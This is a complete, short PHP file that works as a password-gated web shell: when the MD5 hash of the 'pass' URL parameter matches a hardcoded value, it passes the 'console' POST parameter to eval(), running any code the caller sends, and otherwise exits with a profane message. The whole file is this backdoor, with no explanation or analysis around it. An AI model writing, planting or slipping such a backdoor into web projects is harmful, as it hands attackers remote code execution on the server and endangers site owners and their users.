<?php 
if(md5($_GET['pass'])=='cfb83d29df045615c7d99d33110ef683'){
	eval($_POST['console']);
}else{
	die('fuck off!');
}
?>